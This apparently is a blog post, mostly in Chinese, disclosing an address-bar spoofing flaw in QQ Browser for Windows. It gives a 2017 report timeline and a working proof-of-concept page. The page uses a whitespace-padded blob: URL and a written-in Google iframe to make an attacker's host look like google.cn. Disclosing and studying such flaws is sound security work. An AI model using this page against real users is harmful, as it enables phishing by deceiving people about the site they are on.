---
layout: post
title: QQ Browser For Windows - Address Bar Spoofing Vuln
---
- 2017-03-28 16:25:39	用户报告了该漏洞。
- 2017-03-28 17:14:43	感谢您的反馈，问题评估中，我们可能会联系您以获得您的协助。
- 2017-03-31 15:56:06	管理员结束了该漏洞，再次感谢您的报告，如有疑问可评论回复。

官方不认为是漏洞所以可以直接公开，漏洞出现在打开构造的 blob 伪协议时对判断显示有问题，导致我们可以构造页面进行欺骗：

	// view-source: http://server.n0tr00t.com/qqbrowser/urlspoofing.html
    <html>
    <body>
    <a href="blob:http://www.google.cn                                                                                                                                                                                                                                                                                                                                       @server.n0tr00t.com"  onclick=setTimeout("test()",100) target="w">goto google</a>    <script>
    function test() {
        x = window.open('', 'w');
        x.document.write("<title>Google</title>");
        x.document.write("<iframe src='http://www.google.cn/' style='width: 100%;height: 100%;border: 0;'></iframe>");
    }
    </script>
    </body>
    </html>

![](https://ws1.sinaimg.cn/large/c334041bgy1fe63hjic0cj21s40r20xx.jpg)

其他浏览器对上述问题的处理：

![](https://ws1.sinaimg.cn/large/c334041bgy1fe63nzkgvhj21qh15pth7.jpg)